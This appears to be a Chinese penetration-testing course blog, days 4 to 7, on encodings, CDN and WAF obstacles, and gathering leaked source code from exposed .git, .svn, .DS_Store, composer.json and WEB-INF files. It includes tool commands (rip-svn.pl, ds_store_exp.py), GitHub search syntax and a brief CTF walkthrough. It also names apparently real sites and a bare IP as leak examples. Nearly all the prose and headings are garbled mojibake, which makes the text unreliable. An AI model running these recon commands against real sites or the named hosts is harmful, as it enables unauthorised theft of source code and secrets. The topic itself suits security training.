<h1 id="ç¬¬4å¤©ï¼šåŸºç¡€å…¥é—¨-30ä½™ç§åŠ å¯†ç¼–ç è¿›åˆ¶-Web-æ•°æ®åº“-ç³»ç»Ÿ-ä»£ç -å‚æ•°å€¼"><a href="#ç¬¬4å¤©ï¼šåŸºç¡€å…¥é—¨-30ä½™ç§åŠ å¯†ç¼–ç è¿›åˆ¶-Web-æ•°æ®åº“-ç³»ç»Ÿ-ä»£ç -å‚æ•°å€¼" class="headerlink" title="ç¬¬4å¤©ï¼šåŸºç¡€å…¥é—¨-30ä½™ç§åŠ å¯†ç¼–ç è¿›åˆ¶&amp;Web&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ&amp;ä»£ç &amp;å‚æ•°å€¼"></a>ç¬¬4å¤©ï¼šåŸºç¡€å…¥é—¨-30ä½™ç§åŠ å¯†ç¼–ç è¿›åˆ¶&amp;Web&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ&amp;ä»£ç &amp;å‚æ•°å€¼</h1><p>ä»Šå¤©è®²çš„è¿™ä¸ªå°±æ˜¯å±äºå¾ˆåŸºç¡€çš„ä¸€éƒ¨åˆ†äº†ï¼Œéƒ½æ˜¯ç›¸å…³åŠ å¯†è§£å¯†çš„ï¼Œä½œä¸ºä¸€ä¸ªctfé€‰æ‰‹è¿™æ–¹é¢äº†è§£çš„ä¹Ÿç®—æŒºå¤šçš„ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸è¿‡å¤šå»è®²è§£äº†ã€‚</p>
<h2 id="1ã€æ–‡ä»¶åŠ å¯†"><a href="#1ã€æ–‡ä»¶åŠ å¯†" class="headerlink" title="1ã€æ–‡ä»¶åŠ å¯†"></a>1ã€æ–‡ä»¶åŠ å¯†</h2><p>é€šè¿‡å„ç§è¯­è¨€è‡ªèº«çš„åŠ å¯†æ–¹å¼ï¼Œå¯¹æºä»£ç è¿›è¡ŒåŠ å¯†ï¼Œä»è€Œè¾¾åˆ°æ•°æ®ä¿æŠ¤çš„åŠŸèƒ½ã€‚</p>
<p>dllåŠ å¯†ã€phpåŠ å¯†ã€SQLåŠ å¯†ã€jaråŠ å¯†</p>
<h2 id="2ã€å¯¹ç¼–ç çš„è§‚å¯Ÿ"><a href="#2ã€å¯¹ç¼–ç çš„è§‚å¯Ÿ" class="headerlink" title="2ã€å¯¹ç¼–ç çš„è§‚å¯Ÿ"></a>2ã€å¯¹ç¼–ç çš„è§‚å¯Ÿ</h2><p>éœ€è¦å»ç†Ÿæ‚‰ä¸€äº›åŠ è§£å¯†çš„ç›¸åº”ç‰¹å¾ï¼Œå¹¶ä¸”è¦æ±‚èƒ½å¤Ÿåœ¨ç¢°è§ä¸€äº›åŠ å¯†åçš„æ•°æ®åèƒ½å¤Ÿå»åˆ¤æ–­å‡ºåŠ å¯†æ–¹æ³•å¹¶ä¸”å¯¹ä¹‹è¿›è¡Œè§£å¯†ã€‚</p>
<h2 id="3ã€æ€»ç»“"><a href="#3ã€æ€»ç»“" class="headerlink" title="3ã€æ€»ç»“"></a>3ã€æ€»ç»“</h2><p>å…¶å®CTFä¸­è¿™äº›å°±æ˜¯ä¸»è¦è€ƒç‚¹ï¼Œå„ç§åƒbaseç³»åˆ—ï¼Œaesï¼Œmd5ç­‰å„ç§å½¢å¼çš„åŠ è§£å¯†ï¼Œè¿™ç§éƒ½èƒ½å¤Ÿåœ¨ç½‘ä¸Šå»æœåˆ°ç›¸å…³çš„åŠ è§£å¯†æ–¹æ¡ˆçš„ã€‚</p>
<h1 id="ç¬¬5å¤©ï¼šåŸºç¡€å…¥é—¨-èµ„äº§æ¶æ„-ç«¯å£-åº”ç”¨-CDN-WAF-ç«™åº“åˆ†ç¦»-è´Ÿè½½å‡è¡¡"><a href="#ç¬¬5å¤©ï¼šåŸºç¡€å…¥é—¨-èµ„äº§æ¶æ„-ç«¯å£-åº”ç”¨-CDN-WAF-ç«™åº“åˆ†ç¦»-è´Ÿè½½å‡è¡¡" class="headerlink" title="ç¬¬5å¤©ï¼šåŸºç¡€å…¥é—¨-èµ„äº§æ¶æ„&amp;ç«¯å£&amp;åº”ç”¨&amp;CDN&amp;WAF&amp;ç«™åº“åˆ†ç¦»&amp;è´Ÿè½½å‡è¡¡"></a>ç¬¬5å¤©ï¼šåŸºç¡€å…¥é—¨-èµ„äº§æ¶æ„&amp;ç«¯å£&amp;åº”ç”¨&amp;CDN&amp;WAF&amp;ç«™åº“åˆ†ç¦»&amp;è´Ÿè½½å‡è¡¡</h1><h2 id="1ã€CDNå’Œè´Ÿè½½å‡è¡¡"><a href="#1ã€CDNå’Œè´Ÿè½½å‡è¡¡" class="headerlink" title="1ã€CDNå’Œè´Ÿè½½å‡è¡¡"></a>1ã€CDNå’Œè´Ÿè½½å‡è¡¡</h2><p>CDNæ˜¯è´­ä¹°ç»“ç‚¹ï¼Œä»è€Œå»è¾¾åˆ°å·¥å…·æœåŠ¡å™¨çš„ä½œç”¨ï¼Œä»è€Œå¯ä»¥åŠ é€Ÿè®¿é—®å›½å¤–ç½‘ç«™çš„ä½œç”¨ï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¢«æ”»æ‰“æ—¶æ— æ³•æ‰¾åˆ°çœŸæ­£çš„ç½‘ç«™æœåŠ¡å™¨ã€‚</p>
<p>è´Ÿè½½å‡è¡¡æ—¶è‡ªèº«ä½¿ç”¨å¤šå°æœåŠ¡å™¨ï¼Œåœ¨è®¿é—®çš„æ—¶å€™å»éšæœºè®¿é—®ä¸€å°æœåŠ¡å™¨ï¼Œä»è€Œä¹Ÿèƒ½èµ·åˆ°é˜²æ­¢æ¸—é€çš„ä½œç”¨ã€‚</p>
<h2 id="2ã€webå®‰å…¨é—®é¢˜"><a href="#2ã€webå®‰å…¨é—®é¢˜" class="headerlink" title="2ã€webå®‰å…¨é—®é¢˜"></a>2ã€webå®‰å…¨é—®é¢˜</h2><p>ç›®å½•ç«™ç‚¹</p>
<p>ç«¯å£ç«™ç‚¹</p>
<p>ipç«™ç‚¹</p>
<p>æœåŠ¡å™¨ç«™ç‚¹</p>
<p>ç«™ç‚¹æ’ä»¶</p>
<h2 id="3ã€ç•ªå¤–å®‰å…¨é—®é¢˜"><a href="#3ã€ç•ªå¤–å®‰å…¨é—®é¢˜" class="headerlink" title="3ã€ç•ªå¤–å®‰å…¨é—®é¢˜"></a>3ã€ç•ªå¤–å®‰å…¨é—®é¢˜</h2><p>åŸŸåæ³¨å†Œå•†</p>
<p>æœåŠ¡å™¨å‚å•†</p>
<p>ç®¡ç†äººå‘˜å®‰å…¨</p>
<h2 id="4ã€ä¸€äº›é˜»ç¢"><a href="#4ã€ä¸€äº›é˜»ç¢" class="headerlink" title="4ã€ä¸€äº›é˜»ç¢"></a>4ã€ä¸€äº›é˜»ç¢</h2><p>ç«™åº“åˆ†ç¦»</p>
<p>CDNåŠ é€ŸæœåŠ¡</p>
<p>è´Ÿè½½å‡è¡¡æœåŠ¡</p>
<p>WAFåº”ç”¨é˜²ç«å¢™</p>
<p>ä¸»æœºé˜²æŠ¤é˜²ç«å¢™</p>
<h2 id="5ã€æ€»ç»“"><a href="#5ã€æ€»ç»“" class="headerlink" title="5ã€æ€»ç»“"></a>5ã€æ€»ç»“</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CDNï¼ˆContent Delivery Networkï¼‰æ˜¯ä¸€ç§åˆ†å¸ƒå¼ç½‘ç»œæ¶æ„ï¼Œæ—¨åœ¨æä¾›é«˜æ€§èƒ½ã€å¯æ‰©å±•çš„å†…å®¹ä¼ è¾“å’Œäº¤ä»˜æœåŠ¡ã€‚CDN</span><br><span class="line">çš„ç›®æ ‡æ˜¯åŠ å¿«ç½‘ç«™å’Œåº”ç”¨ç¨‹åºçš„å†…å®¹ä¼ è¾“é€Ÿåº¦ï¼Œå‡å°‘å»¶è¿Ÿå¹¶æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒã€‚</span><br><span class="line"></span><br><span class="line">CDN çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">ç¼“å­˜ï¼šCDN åœ¨å…¨çƒå„åœ°éƒ¨ç½²äº†å¤šä¸ªè¾¹ç¼˜èŠ‚ç‚¹æœåŠ¡å™¨ï¼Œè¿™äº›æœåŠ¡å™¨ä¸Šæœ‰å¤§å®¹é‡çš„ç¼“å­˜å­˜å‚¨ã€‚åŸå§‹å†…å®¹ï¼ˆå¦‚ç½‘é¡µã€å›¾åƒã€è§†é¢‘ç­‰ï¼‰ä¼šè¢«ç¼“å­˜åœ¨è¿™äº›æœåŠ¡å™¨ä¸Šã€‚</span><br><span class="line">è·¯ç”±ï¼šå½“ç”¨æˆ·è¯·æ±‚è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œè¯·æ±‚ä¼šè¢«æ™ºèƒ½è·¯ç”±åˆ°è·ç¦»ç”¨æˆ·æœ€è¿‘çš„è¾¹ç¼˜èŠ‚ç‚¹æœåŠ¡å™¨ã€‚</span><br><span class="line">åŠ é€Ÿäº¤ä»˜ï¼šè¾¹ç¼˜èŠ‚ç‚¹æœåŠ¡å™¨æä¾›ç¼“å­˜çš„å†…å®¹ï¼Œç›´æ¥å‘ç”¨æˆ·æä¾›æ‰€éœ€çš„èµ„æºï¼Œè€Œä¸å¿…æ¯æ¬¡éƒ½ä»æºæœåŠ¡å™¨è·å–ã€‚è¿™æ ·å¯ä»¥æ˜¾è‘—å‡å°‘ç½‘ç»œå»¶è¿Ÿï¼Œå¹¶æé«˜å†…å®¹çš„ä¼ è¾“é€Ÿåº¦å’Œå“åº”æ—¶é—´ã€‚</span><br><span class="line">è´Ÿè½½å‡è¡¡ï¼šCDN å¯ä»¥æ ¹æ®æµé‡è´Ÿè½½å’Œç½‘ç»œæ‹¥å¡æƒ…å†µè‡ªåŠ¨é€‰æ‹©æœ€ä½³çš„è¾¹ç¼˜èŠ‚ç‚¹æ¥å¤„ç†è¯·æ±‚ï¼Œç¡®ä¿é«˜å¯ç”¨æ€§å’Œç¨³å®šæ€§ã€‚ CDNçš„ä¼˜ç‚¹åŒ…æ‹¬ï¼š</span><br><span class="line"></span><br><span class="line">åŠ é€Ÿç½‘ç«™å’Œåº”ç”¨ç¨‹åºçš„å†…å®¹ä¼ è¾“é€Ÿåº¦ï¼Œæä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒã€‚ å‡è½»æºæœåŠ¡å™¨çš„è´Ÿè½½ï¼Œæé«˜å¯æ‰©å±•æ€§å’Œç¨³å®šæ€§ã€‚</span><br><span class="line">æä¾›å…¨çƒèŒƒå›´çš„ç½‘ç»œè¦†ç›–ï¼Œç¡®ä¿å†…å®¹åœ¨ç”¨æˆ·é™„è¿‘çš„èŠ‚ç‚¹ä¸Šæä¾›ã€‚</span><br><span class="line">CDNå¹¿æ³›åº”ç”¨äºç½‘ç«™ã€åº”ç”¨ç¨‹åºã€åª’ä½“æµç­‰é¢†åŸŸï¼Œè®¸å¤šçŸ¥åçš„äº’è”ç½‘å…¬å¸å’ŒæœåŠ¡æä¾›å•†éƒ½ä½¿ç”¨CDNæ¥æä¾›å¿«é€Ÿã€é«˜æ•ˆçš„å†…å®¹äº¤ä»˜ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è´Ÿè½½å‡è¡¡ï¼ˆLoadBalancingï¼‰æ˜¯ä¸€ç§åœ¨è®¡ç®—æœºç½‘ç»œä¸­åˆ†é…å·¥ä½œè´Ÿè½½çš„æ–¹æ³•ï¼Œé€šè¿‡å°†è¯·æ±‚å‡åŒ€åœ°åˆ†å‘åˆ°å¤šä¸ªæœåŠ¡å™¨æˆ–èµ„æºä¸Šï¼Œä»¥æé«˜ç³»ç»Ÿçš„æ€§èƒ½ã€å¯é æ€§å’Œå¯æ‰©å±•æ€§ã€‚</span><br><span class="line">è´Ÿè½½å‡è¡¡çš„ä¸»è¦ç›®æ ‡æ˜¯é¿å…å•ä¸ªæœåŠ¡å™¨è¿‡è½½ï¼Œå¹¶ç¡®ä¿æ¯ä¸ªæœåŠ¡å™¨éƒ½èƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†è¯·æ±‚ã€‚å®ƒå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š</span><br><span class="line">è¯·æ±‚åˆ†å‘ï¼šè´Ÿè½½å‡è¡¡å™¨æ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶å°†å…¶åˆ†å‘ç»™åç«¯çš„å¤šä¸ªæœåŠ¡å™¨ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥åŸºäºä¸åŒçš„ç®—æ³•ï¼Œå¦‚è½®è¯¢ã€æœ€å°‘è¿æ¥ã€æƒé‡ç­‰ï¼Œä»¥ç¡®ä¿è¯·æ±‚å¹³å‡åœ°åˆ†å¸ƒåˆ°å„ä¸ªæœåŠ¡å™¨ä¸Šã€‚</span><br><span class="line">å¥åº·æ£€æŸ¥ï¼šè´Ÿè½½å‡è¡¡å™¨ä¼šå‘¨æœŸæ€§åœ°å¯¹åç«¯æœåŠ¡å™¨è¿›è¡Œå¥åº·çŠ¶æ€æ£€æŸ¥ï¼Œä»¥ç¡®ä¿å®ƒä»¬æ­£å¸¸è¿è¡Œã€‚å¦‚æœæŸä¸ªæœåŠ¡å™¨å‡ºç°æ•…éšœæˆ–ä¸å¯ç”¨ï¼Œè´Ÿè½½å‡è¡¡å™¨å°†è‡ªåŠ¨å°†è¯·æ±‚è½¬å‘åˆ°å…¶ä»–å¯ç”¨çš„æœåŠ¡å™¨ä¸Šã€‚</span><br><span class="line">æ‰©å±•æ€§ï¼šå½“ç³»ç»Ÿè´Ÿè½½å¢åŠ æ—¶ï¼Œå¯ä»¥å‘è´Ÿè½½å‡è¡¡å™¨æ·»åŠ æ›´å¤šçš„æœåŠ¡å™¨ï¼Œä»¥æ»¡è¶³ä¸æ–­å¢é•¿çš„è¯·æ±‚ã€‚è´Ÿè½½å‡è¡¡å™¨å°†è‡ªåŠ¨å°†æµé‡åˆ†å‘åˆ°æ–°æ·»åŠ çš„æœåŠ¡å™¨ä¸Šï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„å®¹é‡å’Œæ€§èƒ½ã€‚</span><br><span class="line">è´Ÿè½½å‡è¡¡åœ¨è®¸å¤šåº”ç”¨åœºæ™¯ä¸­å‘æŒ¥å…³é”®ä½œç”¨ï¼Œå¦‚ç½‘ç«™å’Œåº”ç”¨ç¨‹åºçš„é«˜å¯ç”¨æ€§ã€æµé‡ç®¡ç†ã€æé«˜ç³»ç»Ÿååé‡ç­‰ã€‚å¸¸è§çš„è´Ÿè½½å‡è¡¡æŠ€æœ¯åŒ…æ‹¬ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨ã€è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨å’Œäº‘å¹³å°æä¾›çš„è´Ÿè½½å‡è¡¡æœåŠ¡ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬6å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-Webæ¶æ„ç¯‡-åŸŸå-è¯­è¨€-ä¸­é—´ä»¶-æ•°æ®åº“-ç³»ç»Ÿ-æºç è·å–"><a href="#ç¬¬6å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-Webæ¶æ„ç¯‡-åŸŸå-è¯­è¨€-ä¸­é—´ä»¶-æ•°æ®åº“-ç³»ç»Ÿ-æºç è·å–" class="headerlink" title="ç¬¬6å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-Webæ¶æ„ç¯‡&amp;åŸŸå&amp;è¯­è¨€&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ&amp;æºç è·å–"></a>ç¬¬6å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-Webæ¶æ„ç¯‡&amp;åŸŸå&amp;è¯­è¨€&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ&amp;æºç è·å–</h1><p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>1ã€æ‰“ç‚¹-Webæ¶æ„-è¯­è¨€&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“&amp;ç³»ç»Ÿç­‰</p>
<p>2ã€æ‰“ç‚¹-Webæºç -CMSå¼€æº&amp;é—­æºå”®å–&amp;è‡ªä¸»ç ”å‘ç­‰</p>
<p>3ã€æ‰“ç‚¹-Webæºç è·å–-æ³„éœ²å®‰å…¨&amp;èµ„æºç›‘æ§&amp;å…¶ä»–</p>
<p>4ã€æ‰“ç‚¹-WebåŸŸå-å­åŸŸå&amp;åæŸ¥åŸŸå&amp;æ—æ³¨ç­‰</p>
<p>ä¿¡æ¯ç‚¹ï¼š</p>
<p>åŸºç¡€ä¿¡æ¯ï¼Œç³»ç»Ÿä¿¡æ¯ï¼Œåº”ç”¨ä¿¡æ¯ï¼Œé˜²æŠ¤ä¿¡æ¯ï¼Œäººå‘˜ä¿¡æ¯ï¼Œå…¶ä»–ä¿¡æ¯ç­‰</p>
<p>æŠ€æœ¯ç‚¹ï¼š</p>
<p>CMSè¯†åˆ«ï¼Œç«¯å£æ‰«æï¼ŒCDNç»•è¿‡ï¼Œæºç è·å–ï¼Œå­åŸŸåæŸ¥è¯¢ï¼ŒWAFè¯†åˆ«ï¼Œè´Ÿè½½å‡è¡¡è¯†åˆ«ç­‰</p>
<h1 id="ç¬¬7å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-èµ„äº§æ³„æ¼-CMSè¯†åˆ«-Gitç›‘æ§-SVN-DS-Store-å¤‡ä»½"><a href="#ç¬¬7å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-èµ„äº§æ³„æ¼-CMSè¯†åˆ«-Gitç›‘æ§-SVN-DS-Store-å¤‡ä»½" class="headerlink" title="ç¬¬7å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-èµ„äº§æ³„æ¼&amp;CMSè¯†åˆ«&amp;Gitç›‘æ§&amp;SVN&amp;DS_Store&amp;å¤‡ä»½"></a>ç¬¬7å¤©ï¼šä¿¡æ¯æ‰“ç‚¹-èµ„äº§æ³„æ¼&amp;CMSè¯†åˆ«&amp;Gitç›‘æ§&amp;SVN&amp;DS_Store&amp;å¤‡ä»½</h1><p>çŸ¥è¯†ç‚¹ï¼š<br>1ã€CMSæŒ‡çº¹è¯†åˆ«æºç è·å–æ–¹å¼<br>2ã€ä¹ æƒ¯&amp;é…ç½®&amp;ç‰¹æ€§ç­‰è·å–æ–¹å¼<br>3ã€æ‰˜ç®¡èµ„äº§å¹³å°èµ„æºæœç´¢ç›‘æ§</p>
<p>è¯¦ç»†ç‚¹ï¼š<br>å‚è€ƒï¼š<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>æºç æ³„æ¼åŸå› ï¼š<br>1ã€ä»æºç æœ¬èº«çš„ç‰¹æ€§å…¥å£<br>2ã€ä»ç®¡ç†å‘˜ä¸å¥½çš„ä¹ æƒ¯å…¥å£<br>3ã€ä»ç®¡ç†å‘˜ä¸å¥½çš„é…ç½®å…¥å£<br>4ã€ä»ç®¡ç†å‘˜ä¸å¥½çš„æ„è¯†å…¥å£<br>5ã€ä»ç®¡ç†å‘˜èµ„æºä¿¡æ¯æœé›†å…¥å£</p>
<p>æºç æ³„æ¼é›†åˆï¼š<br>composer.]son<br>gitæºç æ³„éœ²<br>svnæºç æ³„éœ²<br>hgæºç æ³„æ¼<br>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶<br>WEB-INF&#x2F;web.m1æ³„éœ²<br>DS Storeæ–‡ä»¶æ³„éœ²<br>SWPæ–‡ä»¶æ³„éœ²<br>CVSæ³„éœ²<br>Bzræ³„éœ²<br>GitHubæºç æ³„æ¼</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>ç›´æ¥è·å–-CMSè¯†åˆ«-äº‘æ‚‰æŒ‡çº¹è¯†åˆ«å¹³å°<br>ï¼ˆyunsee.cn åœ¨çº¿æŒ‡çº¹è¯†åˆ«å¹³å°ï¼‰<br>ä¹ æƒ¯ä¸å¥½å¤‡ä»½æ–‡ä»¶-æŸé»‘é˜”åšå®¢æºç æ³„æ¼<br>ï¼ˆç½‘ç«™ç®¡ç†å‘˜å°†ç½‘ç«™å¤‡ä»½åˆ°ç½‘ç«™ç›®å½•ä¸‹é€ æˆæºç æ³„éœ²ï¼‰<br>é…ç½®ä¸å½“-GITæ³„æ¼æŸç¨‹åºå‘˜åšå®¢æºç æ³„æ¼<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
<p>å½“åœ¨ä¸€ä¸ªç©ºç›®å½•æ‰§è¡Œ git init æ—¶ï¼ŒGit ä¼šåˆ›å»ºä¸€ä¸ª .git ç›®å½•ã€‚ è¿™ä¸ªç›®å½•åŒ…å«æ‰€æœ‰çš„ Git å­˜å‚¨å’Œæ“ä½œçš„å¯¹è±¡ã€‚ å¦‚æœæƒ³å¤‡ä»½æˆ–å¤åˆ¶ä¸€ä¸ªç‰ˆæœ¬åº“ï¼Œåªéœ€æŠŠè¿™ä¸ªç›®å½•æ‹·è´è‡³å¦ä¸€å¤„å°±å¯ä»¥äº†<br>æ¯”å¦‚æŸä¸ªç½‘ç«™å­˜åœ¨.gitæ–‡ä»¶æ³„éœ²ï¼Œå¯ä»¥ï¼š<br>åˆ©ç”¨æ–¹å¼ï¼š<br>githubä¸Šçš„githackå¯ä»¥æŠŠæ•´ä¸ª.gitå¤‡ä»½çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚å®ƒèƒ½è§£æ .git&#x2F;index æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼šæ–‡ä»¶åå’Œæ–‡ä»¶ sha1ï¼Œç„¶åå» .git&#x2F;objects&#x2F; æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œé€šè¿‡ zlib è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç <br>é…ç½®ä¸å½“-SVNæ³„æ¼-æŸå›½å¤–å°ä¼™å­æºç æ³„æ¼<br>SVN æ˜¯ Subversion çš„ç®€ç§°ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç›¸è¾ƒäº RCSã€CVSï¼Œå®ƒé‡‡ç”¨äº†åˆ†æ”¯ç®¡ç†ç³»ç»Ÿï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡å°±æ˜¯å–ä»£ CVSã€‚äº’è”ç½‘ä¸Šå¾ˆå¤šç‰ˆæœ¬æ§åˆ¶æœåŠ¡å·²ä» CVS è¿ç§»åˆ° Subversionã€‚<br>å¾ˆå¤šç½‘ç«™éƒ½ä½¿ç”¨äº† svn ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå’Œä½¿ç”¨ git ç‰ˆæœ¬æ§åˆ¶å™¨ç±»ä¼¼ï¼Œå¾ˆå¤šå¼€å‘è€…ç½‘ç«™å®‰å…¨æ„è¯†ä¸è¶³ï¼Œä»£ç æ”¾åˆ°ç”Ÿäº§åå¢ƒä¸­åï¼Œæ²¡æœ‰æ¸…ç† svn çš„ä¸€äº›ä¿¡æ¯ï¼Œå¯¼è‡´ svn æ®‹ç•™ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å·¥å…· dvcs-ripper ä¸‹è½½ç½‘ç«™æºç ã€‚<br>å½“å¯ä»¥è®¿é—®åˆ°&#x2F;.svn&#x2F;entriesçš„æ—¶å€™ï¼Œå°±è¯æ˜å­˜åœ¨äº†ã€‚<br>æ¯”å¦‚ä¹Œäº‘æ›¾ç»çˆ†å‡ºçš„æŸä¸ªç½‘ç«™ï¼š</p>
<p><a href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>åˆ©ç”¨å·¥å…· <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>å·¥å…·å‘½ä»¤ rip-svn.pl -v -u <a href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
<p>é…ç½®ä¸å½“-DS Storeæ³„æ¼-æŸå¼€å‘Macæºç æ³„æ¼<br>.DS_Store æ–‡ä»¶ MAC ç³»ç»Ÿæ˜¯ç”¨æ¥å­˜å‚¨è¿™ä¸ªæ–‡ä»¶å¤¹çš„æ˜¾ç¤ºå±æ€§çš„ï¼šæ¯”å¦‚æ–‡ä»¶å›¾æ ‡çš„æ‘†æ”¾ä½ç½®ã€‚å¦‚æœç”¨æˆ·åˆ é™¤ä»¥åçš„å‰¯ä½œç”¨å°±æ˜¯è¿™äº›ä¿¡æ¯çš„å¤±å»ã€‚</p>
<p>è¿™äº›æ–‡ä»¶æœ¬æ¥æ˜¯ç»™ Finder ä½¿ç”¨çš„ï¼Œä½†å®ƒä»¬è¢«è®¾æƒ³ä½œä¸ºä¸€ç§æ›´é€šç”¨çš„æœ‰å…³æ˜¾ç¤ºè®¾ç½®çš„å…ƒæ•°æ®å­˜å‚¨ï¼Œè¯¸å¦‚å›¾æ ‡ä½ç½®å’Œè§†å›¾è®¾ç½®ã€‚ å½“ä½ éœ€è¦æŠŠä»£ç ä¸Šä¼ çš„æ—¶å€™ï¼Œå®‰å…¨æ­£ç¡®çš„æ“ä½œåº”è¯¥æŠŠ .DS_Store æ–‡ä»¶åˆ é™¤æ‰æ­£ç¡®ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œæ‰€æœ‰çš„æ–‡ä»¶åç§°ã€‚</p>
<p>å½“è®¿é—®&#x2F;.ds_storeå¯ä»¥è®¿é—®çš„åˆ°ï¼Œå°±è¯æ˜å­˜åœ¨ã€‚ä¾‹å¦‚ï¼š</p>
<p><a href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
<p>å·¥å…·:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>ä½¿ç”¨æ–¹å¼ï¼š</p>
<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
<p>PHPç‰¹æ€§-composer.jsonæ³„æ¼-æŸç›´æ¥æ­å»ºæºç æ³„æ¼</p>
<p>ä¾‹å¦‚ï¼š<a href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
<blockquote>
<p>ä¸‹è½½é…åˆ-WEB-INFæ³„éœ²-RoarCTF-2019-EasyJava</p>
<p>è§£é¢˜æ€è·¯ï¼šè®¿é—®é¶åœºé€šè¿‡æ§åˆ¶filenameæ¥ä»»æ„æ–‡ä»¶ä¸‹è½½</p>
<p>å› ä¸ºWEB-INFä¼šå­˜å‚¨é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥æ„é€ filename&#x3D;WEB-INF&#x2F;web.xml,æ­¤æ–‡ä»¶ä¼šè®°å½•æºç çš„ç»“æ„</p>
<p>è®¿é—®æ–‡ä»¶å†…å®¹ï¼Œå¹¶æ„é€ æ–‡ä»¶åä¸‹è½½</p>
<p>æœ€åé€šè¿‡åç¼–è¯‘å‡ºflag</p>
</blockquote>
<blockquote>
<p>èµ„æºç›‘æ§-GITHUBæ³„æ¼-è¯­æ³•æœç´¢&amp;å…³é”®å­—æœç´¢&amp;ç¤¾å·¥<br>é€šè¿‡githubå’Œgoogle hackè¯­æ³•æœç´¢ç›¸å…³ä¿¡æ¯<br>ç›¸å…³åˆ©ç”¨é¡¹ç›®ï¼š</p>
<p>cMsè¯†åˆ«ï¼š<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> å¤‡ä»½ï¼šæ•æ„Ÿç›®å½•æ–‡ä»¶æ‰«æ -7 kbscan-WebPathBrute<br>CVS:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
</blockquote>
<blockquote>
<p>GITHUBèµ„æºæœç´¢ï¼š<br>in:name test #ä»“åº“æ ‡é¢˜æœç´¢å«æœ‰å…³é”®å­—<br>in:descripton test #ä»“åº“æè¿°æœç´¢å«æœ‰å…³é”®å­—<br>in:readme test #Readmeæ–‡ä»¶æœç´ å«æœ‰å…³é”®å­—<br>stars:&gt;3000 test #starsæ•°é‡å¤§äº3000çš„æœç´¢å…³é”®å­—</p>
</blockquote>
